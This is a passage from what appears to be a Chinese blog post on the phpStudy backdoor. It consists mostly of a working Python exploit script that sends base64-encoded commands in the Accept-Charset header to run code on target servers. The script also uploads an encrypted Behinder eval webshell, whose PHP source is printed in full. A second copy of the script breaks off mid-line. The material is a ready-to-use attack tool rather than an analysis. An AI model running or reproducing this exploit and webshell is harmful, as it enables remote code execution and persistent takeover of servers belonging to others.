X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vUEhQVHV0b3JpYWwvV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2016</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span class="string">'ZmlsZV9wdXRfY29udGVudHMoJy4vV1dXL2Fib3V0LnBocCcsICc8P3BocApAZXJyb3JfcmVwb3J0aW5nKDApOwpzZXNzaW9uX3N0YXJ0KCk7CmlmIChpc3NldCgkX0dFVFsicGFzcyJdKSkKewogICAgJGtleT1zdWJzdHIobWQ1KHVuaXFpZChyYW5kKCkpKSwxNik7CiAgICAkX1NFU1NJT05bImsiXT0ka2V5OwogICAgcHJpbnQgJGtleTsKfQplbHNlCnsKICAgICRrZXk9JF9TRVNTSU9OWyJrIl07CgkkcG9zdD1maWxlX2dldF9jb250ZW50cygicGhwOi8vaW5wdXQiKTsKCWlmKCFleHRlbnNpb25fbG9hZGVkKCJvcGVuc3NsIikpCgl7CgkJJHQ9ImJhc2U2NF8iLiJkZWNvZGUiOwoJCSRwb3N0PSR0KCRwb3N0LiIiKTsKCQkKCQlmb3IoJGk9MDskaTxzdHJsZW4oJHBvc3QpOyRpKyspIHsKICAgIAkJCSAkcG9zdFskaV0gPSAkcG9zdFskaV1eJGtleVskaSsxJjE1XTsgCiAgICAJCQl9Cgl9CgllbHNlCgl7CgkJJHBvc3Q9b3BlbnNzbF9kZWNyeXB0KCRwb3N0LCAiQUVTMTI4IiwgJGtleSk7Cgl9CiAgICAkYXJyPWV4cGxvZGUoInwiLCRwb3N0KTsKICAgICRmdW5jPSRhcnJbMF07CiAgICAkcGFyYW1zPSRhcnJbMV07CgljbGFzcyBDe3B1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkcCkge2V2YWwoJHAuIiIpO319CglAbmV3IEMoJHBhcmFtcyk7Cn0KPz4nKTs='</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Upload Successful.'</span>)</span><br><span class="line">                print(<span class="string">'[+] The webshell is &#123;&#125;//&#123;&#125;/about.php'</span>.format(self._url.split(<span class="string">'/'</span>)[<span class="number">0</span>],self._url.split(<span class="string">'/'</span>)[<span class="number">2</span>]))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'EXP for phpstudy_backdoor.'</span>)</span><br><span class="line">    parse.usage=<span class="string">"""phpstudy_backdoor_getshell.py [-h] [-u URL] [-c ...]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       example: python3 phpstudy_backdoor_getshell.py -u http://192.168.1.103/index.php -c 'system(\\"whoami\\");'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       使用反斜杠和单双引号防止转义的问题，并解决argparse下以空格解析参数不能当做一个字符串的问题</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The Target Url'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-c'</span>,<span class="string">'--command'</span>, nargs=argparse.REMAINDER,help=<span class="string">'Please input the exploit command'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w8'</span>,<span class="string">'--webshell_8'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2018'</span>)</span><br><span class="line">    parse.add_argument(<span class="string">'-w6'</span>,<span class="string">'--webshell_6'</span>,action=<span class="string">'store_true'</span>,help=<span class="string">'upload a Behinder webshell for phpstudy2016'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line"></span><br><span class="line">    x = phpstudy_backdoor_getshell(<span class="string">''</span>,<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        print(parse.print_help())</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &lt; <span class="number">4</span> <span class="keyword">and</span> len(sys.argv) &gt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.check_Target()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(sys.argv) &gt;= <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">if</span> args.url <span class="keyword">and</span> args.command:</span><br><span class="line">            commands = <span class="string">''</span> </span><br><span class="line">            <span class="keyword">for</span> cmd <span class="keyword">in</span> args.command:</span><br><span class="line">                commands += cmd + <span class="string">' '</span></span><br><span class="line">            command = base64.b64encode(commands.encode(<span class="string">'utf-8'</span>))</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.command = command</span><br><span class="line">            x.exploit()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_8:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2018()</span><br><span class="line">        <span class="keyword">elif</span> args.url <span class="keyword">and</span> args.webshell_6:</span><br><span class="line">            x.url = args.url</span><br><span class="line">            x.upload_shell_2016()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-] some error!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p>phpstudy 2018</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png" alt></p>
<p>phpstudy 2016</p>
<blockquote>
<p>唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_put_contents(<span class="string">'./WWW/about.php'</span>, <span class="string">'&lt;?php</span></span><br><span class="line"><span class="string">@error_reporting(0);</span></span><br><span class="line"><span class="string">session_start();</span></span><br><span class="line"><span class="string">if (isset($_GET["pass"]))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=substr(md5(uniqid(rand())),16);</span></span><br><span class="line"><span class="string">    $_SESSION["k"]=$key;</span></span><br><span class="line"><span class="string">    print $key;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    $key=$_SESSION["k"];</span></span><br><span class="line"><span class="string">	$post=file_get_contents("php://input");</span></span><br><span class="line"><span class="string">	if(!extension_loaded("openssl"))</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$t="base64_"."decode";</span></span><br><span class="line"><span class="string">		$post=$t($post."");</span></span><br><span class="line"><span class="string">		</span></span><br><span class="line"><span class="string">		for($i=0;$i&lt;strlen($post);$i++) &#123;</span></span><br><span class="line"><span class="string">    			 $post[$i] = $post[$i]^$key[$i+1&amp;15]; </span></span><br><span class="line"><span class="string">    			&#125;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">	else</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$post=openssl_decrypt($post, "AES128", $key);</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">    $arr=explode("|",$post);</span></span><br><span class="line"><span class="string">    $func=$arr[0];</span></span><br><span class="line"><span class="string">    $params=$arr[1];</span></span><br><span class="line"><span class="string">	class C&#123;public function __construct($p) &#123;eval($p."");&#125;&#125;</span></span><br><span class="line"><span class="string">	@new C($params);</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;'</span>);</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png" alt></p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png" alt></p>
<h4 id="不带参数检测、利用、传shell"><a href="#不带参数检测、利用、传shell" class="headerlink" title="不带参数检测、利用、传shell"></a>不带参数检测、利用、传shell</h4><blockquote>
<p>和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了</p>
</blockquote>
<p>code</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Description: </span></span><br><span class="line"><span class="string">@Author: demos</span></span><br><span class="line"><span class="string">@Github: https://github.com/demossl</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">USER_AGENTS = [</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; AcooBrowser; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.5; AOLBuild 4337.35; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN) AppleWebKit/523.15 (KHTML, like Gecko, Safari/419.3) Arora/0.3 (Change: 287 c9dfb30)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux; en-US) AppleWebKit/527+ (KHTML, like Gecko, Safari/419.3) Arora/0.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.2pre) Gecko/20070215 K-Ninja/2.1.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/20080705 Firefox/3.0 Kapiko/3.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Linux i686; U;) Gecko/20070322 Kazehakase/0.4.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko Fedora/1.9.0.8-1.fc10 Kazehakase/0.5.6"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.56 Safari/535.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/535.20 (KHTML, like Gecko) Chrome/19.0.1036.7 Safari/535.20"</span>,</span><br><span class="line">    <span class="string">"Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E; LBBROWSER)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.84 Safari/535.11 LBBROWSER"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; QQBrowser/7.0.3698.400)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; SV1; QQDownload 732; .NET4.0C; .NET4.0E; 360SE)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; QQDownload 732; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (iPad; U; CPU OS 4_2_1 like Mac OS X; zh-cn) AppleWebKit/533.17.9 (KHTML, like Gecko) Version/5.0.2 Mobile/8C148 Safari/6533.18.5"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0b13pre) Gecko/20110307 Firefox/4.0b13pre"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:16.0) Gecko/20100101 Firefox/16.0"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"</span>,</span><br><span class="line">    <span class="string">"Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10"</span></span><br><span class="line">]</span><br><span class="line">TIME_OUT=<span class="number">15</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">phpstudy_backdoor_getshell</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url,command)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">        self._command = command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#访问器 - getter()方法</span></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#修改器 - setter()方法</span></span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @command.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">command</span><span class="params">(self,command)</span>:</span></span><br><span class="line">        self._command = command</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check_Target</span><span class="params">(self)</span>:</span></span><br><span class="line">        poc = &#123;</span><br><span class="line">            <span class="string">"Accept-Charset"</span>: <span class="string">"cGhwaW5mbygpOw=="</span>,</span><br><span class="line">            <span class="string">"Accept-Encoding"</span>: <span class="string">"gzip,deflate"</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            PocRequest = requests.get(self._url,headers=poc,timeout=TIME_OUT)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"phpinfo"</span> <span class="keyword">in</span> str(PocRequest.content):</span><br><span class="line">                print(<span class="string">'[+] Target is vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">'[-] Target is NOT vulnerable.'</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = self._command</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(self._url,headers=headers)</span><br><span class="line">            response.encoding = <span class="string">'gbk'</span></span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                print(<span class="string">'[+] Command Execute Successful.'</span>)</span><br><span class="line">                print(response.text)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                 print(<span class="string">'[-] Looks Like Something Wrong. Maybe target is NOT vulnerable.'</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            print(<span class="string">'[-] Looks Like Something Wrong.\n'</span>)</span><br><span class="line">        </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">upload_shell_2018</span><span class="params">(self)</span>:</span></span><br><span class="line">        headers = &#123;&#125;</span><br><span class="line">        headers[<span class="string">'User-Agent'</span>] = random.choice(USER_AGENTS)</span><br><span class="line">        headers[<span class="string">'Accept-Encoding'</span>] = <span class="string">'gzip,deflate'</span></span><br><span class="line">        headers[<span class="string">'Accept-Charset'</span>] = <span 